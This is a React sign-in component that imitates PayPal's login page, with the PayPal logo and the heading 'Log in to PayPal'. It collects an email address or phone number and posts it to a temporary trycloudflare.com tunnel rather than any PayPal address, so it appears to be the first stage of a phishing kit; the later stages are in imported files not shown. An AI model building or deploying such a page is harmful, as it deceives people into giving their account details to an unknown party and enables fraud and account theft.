import React, { useState, useEffect, useRef } from "react";
import P_P from "./P_P.png";
import "../App.css";
import PhoneInput from 'react-phone-input-2';
import 'react-phone-input-2/lib/high-res.css';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import { faChevronDown, faChevronUp } from '@fortawesome/free-solid-svg-icons';
import { parsePhoneNumberFromString } from'libphonenumber-js';
import CreateAccount from "./CreateAccount";
import Login from "./Login";
import { useAuthStore } from './authStore';

// Spinner component (unchanged)
const Spinner = ({ size = 50, width = 50, borderWidth = 2, color = "transparent" }) => {
  return (
    <div className="spinnerparent">
    <div
      className="half-circle-spinner"
      style={{
        width: width,
        height: size,
        borderWidth: borderWidth,
        borderTopColor: color,
      }}
    />
    </div>
  );
};

const SignIn = () => {
  const { formStage, setFormStage, userData, setUserData } = useAuthStore();
  const [loading, setLoading] = useState(true);
  const [ShowNumber, SetShowNumber] = useState(false);

  useEffect(() => {
    const timer = setTimeout(() => setLoading(false), 2000);
    return () => clearTimeout(timer);
  }, []);

  

  const [showDropdown, setShowDropdown] = useState(true);
  const [selectedCountry, setSelectedCountry] = useState('us');
  const [emailValue, setEmailValue] = useState("");
  const [submitSuccess, setSubmitSuccess] = useState(false);
  const [submitLoading, setSubmitLoading] = useState(false);
  const [formError, setFormError] = useState('');
  const [dialCode, setDialCode] = useState('1');
  const [nationalValue, setNationalValue] = useState('');
  const [body, setBody] = useState(null)

  // Derived full value for the library (minimal prefix when no digits)
  const libraryValue = nationalValue 
    ? `+${dialCode}${nationalValue}` 
    : `+${dialCode} `;

    useEffect(() => {
    const checkOpen = () => {
      const isOpen = !!document.querySelector('.react-tel-input .selected-flag.open') ||
                     !!document.querySelector('.react-tel-input .flag-dropdown.open');
      setShowDropdown(isOpen);
    };

    // Check immediately
    checkOpen();

    // Poll every 100ms (cheap & reliable for this case)
    const interval = setInterval(checkOpen, 100);

    return () => clearInterval(interval);
  }, []);



    const formatNumber = () => {
  if (!nationalValue) return '';
  const phoneNumber = parsePhoneNumberFromString(`+${dialCode}${nationalValue}`);
  if (phoneNumber) {
    return phoneNumber.formatNational(); // or .formatInternational()
  }
  return nationalValue; // fallback
};

  // ─── Validation logic ──────────────────────────────────
  const isPhoneValid = () => {
    if (!nationalValue) return false;
    const full = `+${dialCode}${nationalValue}`;
    const phoneNumber = parsePhoneNumberFromString(full);
    return phoneNumber?.isPossible() || phoneNumber?.isValid() || false;
  };



// Validation function (updated to match cleaning rules)
const isEmailValid = () => {
  const cleaned = emailValue.trim(); // just in case

  // No spaces allowed (already prevented by handler, but double-check)
  if (/\s/.test(cleaned)) return false;

  // Max length 25
  if (cleaned.length > 30) return false;

  // Valid email format
  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
  return emailRegex.test(cleaned);
};

const isFormValid = ShowNumber ? isPhoneValid() : isEmailValid();



  useEffect(() => {
    setFormError('');
  }, [nationalValue, emailValue, ShowNumber]);

const handleSubmit = async (e) => {
  e.preventDefault();

  if (!isFormValid) {
    setFormError(
      ShowNumber
        ? "Please enter a valid phone number"
        : "Please enter a valid email address"
    );
    return;
  }

  setFormError('');
  setSubmitLoading(true);
  setSubmitSuccess(false);
  setLoading(true);

  try {
    const payload = ShowNumber
      ? { name: "User", email: "", phone: `+${dialCode}${nationalValue}` }
      : { name: "User", email: emailValue.trim(), phone: "" };

    const response = await fetch('https://contests-complex-constitution-throws.trycloudflare.com/users', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      credentials: 'include',
      body: JSON.stringify(payload),
    });

    if (response.ok) {
  const data = await response.json();
  
  setUserData(data.user);

  if (data.user.isNew) {
    // New user → complete profile
    setTimeout(() => {
      setLoading(false);
      setSubmitSuccess(true);
      setFormStage('create-account');
    }, 2000);
  } else {
    // Existing user → go to login / dashboard
    setTimeout(() => {
      setLoading(false);
      setSubmitSuccess(true);
      setFormStage('login'); // or 'login-success' or redirect
      // window.location.href = '/dashboard';
    }, 1500);
  }
    } else {
      setFormError(data.error || 'Registration failed. Try again.');
      setLoading(false);
      setFormStage('signin')
    }
  } catch (err) {
    setFormError('Network error – is the server running?');
    console.error(err);
    setLoading(false);
  } finally {
    setSubmitLoading(false);
  }
};

  const Complete = () => {
    setLoading(true);
    setTimeout(() => {
      setLoading(false);
      setFormStage('signup')
    }, 2000);
  };

  return (
    <>
    {formStage === 'create-account' && (
  <>
  {loading && <div className="spinnerparent"><Spinner /></div>}
  <CreateAccount
    dialCode={dialCode}
    selectedCountry={selectedCountry}
    userData={userData}
    onComplete={Complete}
  />
  </>
)}



{formStage === 'login' && (
  <Login
    initialValue={userData?.email || userData?.phone || ''}
    onClose={() => setFormStage('signup')}
  />
)}
{formStage === 'signup' && (
<>
    {loading ? (
        <Spinner />
      ) : (
        <div className="SignIn_Container">
          <div className="header"></div>
          <div className="SignIn">
            <img src={P_P} alt="PayPal_Logo" style={{ width: 64 }} />
            <br />
            <p>Log in to PayPal</p>
            <br />

            {ShowNumber ? (
              <div onSubmit={handleSubmit} method="POST" noValidate
                style={{
                  display: 'flex',
                  minHeight: "5.8rem",
                  gap: '10px',
                  width: '100%',
                  justifyContent: "space-between",
                }}
              >
                {/* Left: Flag + +code + chevron */}
<div
  style={{
    cursor: 'pointer',
    flex: '0 0 auto',
    minWidth: '140px',
    height: '58px',
    display: 'flex',
    alignItems: 'center',
    borderRadius: '10px',
    justifyContent: 'center',
    position: 'relative',
    border: ".8px solid rgba(185, 182, 182, 0.712)",
    marginTop: "15px",
    paddingTop: "5px"
  }}
>
  <PhoneInput
    country={selectedCountry}
    value={libraryValue}
    onChange={(value, countryData) => {
      if (countryData?.countryCode && countryData.countryCode !== selectedCountry) {
        setSelectedCountry(countryData.countryCode);
        setDialCode(countryData.dialCode);
        setNationalValue('');
      }
    }}
    inputStyle={{ display: 'none' }}
    buttonStyle={{
      border: 'none',
      alignItems: 'center',
      justifyContent: 'center',
      cursor: 'pointer',
    }}
    containerStyle={{
      background: '',        // just in case
    }}
  />

  {/* Your custom +code – sits on top */}
  <span
    style={{
      position: 'absolute',
      left: '52px',                     // adjust so it sits nicely after flag
      color: '#000000',
      fontSize: '12.5px',
      fontWeight: '500',
      pointerEvents: 'none', 
      fontFamily: "sans-serif",   
      transform: "translate(1px, -2px)", 
      WebkitTextStroke: "0.02em",              // ensure it's above the flag if needed
    }}
  >
    +{dialCode}
  </span>
  <div className={showDropdown ? "show-dropdown" : "hide-dropdown"}></div>
  {showDropdown && (<div className="show-dropdown2">Phone</div>)}

  {/* Chevron – also on top */}
  <div
    style={{
      position: 'absolute',
      right: '12px',
      top: '46%',
      transform: 'translate(-5px, -40%)',
      pointerEvents: 'none',
      color: 'rgb(0,0,0,.7)',
      fontSize: '18px',
    }}
  >
    <FontAwesomeIcon 
      icon={
        document.querySelector('.react-tel-input .selected-flag.open') ||
        document.querySelector('.react-tel-input .flag-dropdown.open')
          ? faChevronUp 
          : faChevronDown
      } 
    />
  </div>
</div>

                <input
                  type="tel"
                  placeholder="Phone"
                  value={formatNumber()}
                  className="Phone_Input"
                  maxLength={15}
                  onChange={(e) => {
                    const digitsOnly = e.target.value.replace(/\D/g, '');
                    setNationalValue(digitsOnly);
                  }}
                  style={{
                    flex: 1,
                    height: '63px',
                    border: formError === "Please enter a valid phone number"
                      ? '.8px solid red'
                      : '.8px solid rgba(185, 182, 182, 0.712)',
                    outline: 'none',
                    padding: '0 16px',
                    fontSize: '16px',
                    background: 'white',
                  }}
                />
              </div>
            ) : (
              <input
  type="email"
  name="Email"
  id="Email"
  placeholder="Email"
  value={emailValue}
  onKeyDown={(e) => {
    if (e.key === ' ') {
      e.preventDefault();
    }
  }}
  onChange={(e) => {
    const value = e.target.value
      .replace(/\s+/g, '')
      .slice(0, 30);

    setEmailValue(value);
  }}
/>
            )}
            <br />
            <p onClick={() => SetShowNumber(!ShowNumber)}
 className={ShowNumber ? "toggleEmail" : ""}>
              {ShowNumber ? "Use email instead" : "Use phone number instead"}
            </p>
            <br />
            <button
                type="submit"
                disabled={!isFormValid}
                onClick={handleSubmit}
                style={{
                  opacity: isFormValid ? 1 : 0.92,
                  cursor: isFormValid ? 'pointer' : 'not-allowed',
                }}
              >
                Next
              </button>
            <button onClick={() => {
  setLoading(true);
  setTimeout(() => {
    setFormStage('create-account');
    setLoading(false);
  }, 2000);
}}
            >Sign Up</button>
            {ShowNumber ? "" : <a href="#"><p>Forgot email?</p></a>}
          </div>
        </div>
      )}
    </>
)}
    </>
  );
};

export default SignIn;